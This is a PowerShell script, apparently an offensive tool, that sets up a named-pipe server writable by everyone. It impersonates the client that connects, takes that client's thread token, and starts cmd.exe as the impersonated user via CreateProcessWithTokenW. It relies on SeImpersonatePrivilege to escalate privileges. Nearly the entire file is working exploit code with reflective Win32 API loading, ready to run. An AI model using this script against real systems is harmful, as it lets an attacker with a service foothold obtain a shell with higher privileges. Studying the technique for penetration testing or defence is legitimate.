### named pipe server with impersonation (neeeds seimpersonateprivilege) ###
### parts of code from various sources  ###

function Local:Get-DelegateType
    {
        Param
        (
            [OutputType([Type])]
            
            [Parameter( Position = 0)]
            [Type[]]
            $Parameters = (New-Object Type[](0)),
            
            [Parameter( Position = 1 )]
            [Type]
            $ReturnType = [Void]
        )

        $Domain = [AppDomain]::CurrentDomain
        $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
        $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
        $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
        $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
        $MethodBuilder.SetImplementationFlags('Runtime, Managed')
        
        Write-Output $TypeBuilder.CreateType()
    }
 function Local:Get-ProcAddress
    {
        Param
        (
            [OutputType([IntPtr])]
        
            [Parameter( Position = 0, Mandatory = $True )]
            [String]
            $Module,
            
            [Parameter( Position = 1, Mandatory = $True )]
            [String]
            $Procedure
        )

        $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
        $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
        $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
        #not working on win >=10 
	#$GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
	$GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [reflection.bindingflags] "Public,Static", $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null);
	$Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
        $tmpPtr = New-Object IntPtr
        $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
        Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
    }

	$Constants = @{
        ACCESS_SYSTEM_SECURITY = 0x01000000
        READ_CONTROL = 0x00020000
        SYNCHRONIZE = 0x00100000
        STANDARD_RIGHTS_ALL = 0x001F0000
        TOKEN_QUERY = 8
        TOKEN_ADJUST_PRIVILEGES = 0x20
        ERROR_NO_TOKEN = 0x3f0
        SECURITY_DELEGATION = 3
        DACL_SECURITY_INFORMATION = 0x4
        ACCESS_ALLOWED_ACE_TYPE = 0x0
        STANDARD_RIGHTS_REQUIRED = 0x000F0000
        DESKTOP_GENERIC_ALL = 0x000F01FF
        WRITE_DAC = 0x00040000
        OBJECT_INHERIT_ACE = 0x1
        GRANT_ACCESS = 0x1
        TRUSTEE_IS_NAME = 0x1
        TRUSTEE_IS_SID = 0x0
        TRUSTEE_IS_USER = 0x1
        TRUSTEE_IS_WELL_KNOWN_GROUP = 0x5
        TRUSTEE_IS_GROUP = 0x2
        PROCESS_QUERY_INFORMATION = 0x400
        TOKEN_ASSIGN_PRIMARY = 0x1
        TOKEN_DUPLICATE = 0x2
        TOKEN_IMPERSONATE = 0x4
        TOKEN_QUERY_SOURCE = 0x10
        STANDARD_RIGHTS_READ = 0x20000
        TokenStatistics = 10
        TOKEN_ALL_ACCESS = 0xf01ff
        MAXIMUM_ALLOWED = 0x02000000
        THREAD_ALL_ACCESS = 0x1f03ff
        ERROR_INVALID_PARAMETER = 0x57
        LOGON_NETCREDENTIALS_ONLY = 0x2
        SE_PRIVILEGE_ENABLED = 0x2
        SE_PRIVILEGE_ENABLED_BY_DEFAULT = 0x1
        SE_PRIVILEGE_REMOVED = 0x4
    }

  $Win32Constants = New-Object PSObject -Property $Constants
	
  $Domain = [AppDomain]::CurrentDomain
  $DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
  $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
  $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
  $ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]


  #Struct STARTUPINFO
  $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
  $TypeBuilder = $ModuleBuilder.DefineType('STARTUPINFO', $Attributes, [System.ValueType])
  $TypeBuilder.DefineField('cb', [UInt32], 'Public') | Out-Null
  $TypeBuilder.DefineField('lpReserved', [IntPtr], 'Public') | Out-Null
  $TypeBuilder.DefineField('lpDesktop', [IntPtr], 'Public') | Out-Null
  $TypeBuilder.DefineField('lpTitle', [IntPtr], 'Public') | Out-Null
  $TypeBuilder.DefineField('dwX', [UInt32], 'Public') | Out-Null
  $TypeBuilder.DefineField('dwY', [UInt32], 'Public') | Out-Null
  $TypeBuilder.DefineField('dwXSize', [UInt32], 'Public') | Out-Null
  $TypeBuilder.DefineField('dwYSize', [UInt32], 'Public') | Out-Null
  $TypeBuilder.DefineField('dwXCountChars', [UInt32], 'Public') | Out-Null
  $TypeBuilder.DefineField('dwYCountChars', [UInt32], 'Public') | Out-Null
  $TypeBuilder.DefineField('dwFillAttribute', [UInt32], 'Public') | Out-Null
  $TypeBuilder.DefineField('dwFlags', [UInt32], 'Public') | Out-Null
  $TypeBuilder.DefineField('wShowWindow', [UInt16], 'Public') | Out-Null
  $TypeBuilder.DefineField('cbReserved2', [UInt16], 'Public') | Out-Null
  $TypeBuilder.DefineField('lpReserved2', [IntPtr], 'Public') | Out-Null
  $TypeBuilder.DefineField('hStdInput', [IntPtr], 'Public') | Out-Null
  $TypeBuilder.DefineField('hStdOutput', [IntPtr], 'Public') | Out-Null
  $TypeBuilder.DefineField('hStdError', [IntPtr], 'Public') | Out-Null
  $STARTUPINFO = $TypeBuilder.CreateType()

  #Struct PROCESS_INFORMATION
  $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
  $TypeBuilder = $ModuleBuilder.DefineType('PROCESS_INFORMATION', $Attributes, [System.ValueType])
  $TypeBuilder.DefineField('hProcess', [IntPtr], 'Public') | Out-Null
  $TypeBuilder.DefineField('hThread', [IntPtr], 'Public') | Out-Null
  $TypeBuilder.DefineField('dwProcessId', [UInt32], 'Public') | Out-Null
  $TypeBuilder.DefineField('dwThreadId', [UInt32], 'Public') | Out-Null
  $PROCESS_INFORMATION = $TypeBuilder.CreateType()

    
  #API's

  
    
  $OpenThreadTokenAddr = Get-ProcAddress advapi32.dll OpenThreadToken
  $OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
  $OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)
	
  $CreateProcessWithTokenWAddr = Get-ProcAddress advapi32.dll CreateProcessWithTokenW
  $CreateProcessWithTokenWDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([Bool])
  $CreateProcessWithTokenW = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateProcessWithTokenWAddr, $CreateProcessWithTokenWDelegate)
	
  $GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread
  $GetCurrentThreadDelegate = Get-DelegateType @() ([IntPtr])
  $GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)
	
  $memsetAddr = Get-ProcAddress msvcrt.dll memset
  $memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
  $memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)
	
  #$DuplicateTokenExAddr = Get-ProcAddress advapi32.dll DuplicateTokenEx
  #$DuplicateTokenExDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr], [UInt32], [UInt32], [IntPtr].MakeByRefType()) ([Bool])
  #$DuplicateTokenEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DuplicateTokenExAddr, $DuplicateTokenExDelegate)
  
  $ImpersonateNamedPipeClientAddr = Get-ProcAddress Advapi32.dll ImpersonateNamedPipeClient
  $ImpersonateNamedPipeClientDelegate = Get-DelegateType @( [Int] ) ([Int])
  $ImpersonateNamedPipeClient = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateNamedPipeClientAddr, $ImpersonateNamedPipeClientDelegate)	
  
  $RevertToSelfAddr = Get-ProcAddress advapi32.dll RevertToSelf
  $RevertToSelfDelegate = Get-DelegateType @() ([Bool])
  $RevertToSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($RevertToSelfAddr, $RevertToSelfDelegate)

##############################  main ##########################################
$pipename="ottopipe"
$PipeSecurity = New-Object System.IO.Pipes.PipeSecurity
# EveryOne in english instead of "Jeder"
$AccessRule = New-Object System.IO.Pipes.PipeAccessRule( "Jeder", "ReadWrite", "Allow" )
$PipeSecurity.AddAccessRule($AccessRule)
$pipe = New-Object System.IO.Pipes.NamedPipeServerStream($pipename,"InOut",100, "Byte", "None", 1024, 1024, $PipeSecurity)
$PipeHandle = $pipe.SafePipeHandle.DangerousGetHandle()
echo "Waiting for connection on namedpipe:$pipename"
$pipe.WaitForConnection()
$pipeReader = new-object System.IO.StreamReader($pipe)
$Null = $pipereader.ReadToEnd()
$Out = $ImpersonateNamedPipeClient.Invoke([Int]$PipeHandle)
echo "ImpersonateNamedPipeClient: $Out"
$user=[System.Security.Principal.WindowsIdentity]::GetCurrent().Name
###we are impersonating the user, everything we do before RevertoSelf is done on behalf that user
echo "user=$user "
### get the token of the thread impersonated by the user
$ThreadHandle = $GetCurrentThread.Invoke()
[IntPtr]$ThreadToken = [IntPtr]::Zero
[Bool]$Result = $OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_ALL_ACCESS, $true, [Ref]$ThreadToken)
echo "OpenThreadToken:$result"
$RetVal = $RevertToSelf.Invoke()
echo $RetVal
$pipe.close()
#run a process as the previously impersonated user
$StartupInfoSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$STARTUPINFO)
[IntPtr]$StartupInfoPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($StartupInfoSize)
$memset.Invoke($StartupInfoPtr, 0, $StartupInfoSize) | Out-Null
[System.Runtime.InteropServices.Marshal]::WriteInt32($StartupInfoPtr, $StartupInfoSize) 
$ProcessInfoSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$PROCESS_INFORMATION)
[IntPtr]$ProcessInfoPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($ProcessInfoSize)
$memset.Invoke($ProcessInfoPtr, 0, $ProcessInfoSize) | Out-Null
$processname="c:\windows\system32\cmd.exe"
$ProcessNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($processname)
$ProcessArgsPtr = [IntPtr]::Zero
#CreateProcessWithTokenW does not care if the token is impersonation and not primary
$Success = $CreateProcessWithTokenW.Invoke($ThreadToken, 0x0,$ProcessNamePtr, $ProcessArgsPtr, 0, [IntPtr]::Zero, [IntPtr]::Zero, $StartupInfoPtr, $ProcessInfoPtr)
$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
echo "CreateProcessWithToken: $Success  $ErrorCode" 
#####################################################################################
